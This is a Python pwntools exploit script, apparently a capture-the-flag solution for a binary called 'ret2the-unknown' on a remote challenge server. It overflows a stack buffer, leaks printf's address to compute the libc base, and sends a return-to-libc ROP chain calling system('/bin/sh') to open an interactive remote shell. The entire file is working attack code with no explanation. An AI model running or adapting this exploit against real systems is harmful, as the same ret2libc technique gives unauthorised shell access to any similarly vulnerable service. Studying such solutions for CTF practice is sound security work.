from pwn import *

libc = ELF("./libc-2.28.so")
ld = ELF("./ld-2.28.so")
binary = ELF("./ret2the-unknown")
context.binary = binary

#p = process([ld.path, binary.path], env = {"LD_PRELOAD": libc.path})
p = remote("mc.ax", 31568)
#input("attach gdb")

p.recv()

payload = cyclic(500)
payload = payload[:cyclic_find("kaaa")]
payload += p64(binary.symbols["main"])

p.sendline(payload)

response = p.recv().split()
print(response)
printf_addr = int(response[15], 16)

libc.address = printf_addr - libc.symbols["printf"]
log.info("libc base @ %s" % hex(libc.address))

second_payload = cyclic(500)
second_payload = second_payload[:cyclic_find("kaaa")]

rop = ROP(libc)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("pop rdi @ %s" % hex(POP_RDI))
log.info("ret @ %s" % hex(RET))
log.info("BINSH string @ %s" % hex(BINSH))
log.info("SYSTEM @ %s" % hex(SYSTEM))

second_payload += p64(POP_RDI) + p64(BINSH) +  p64(SYSTEM)  

p.sendline(second_payload)

p.interactive()
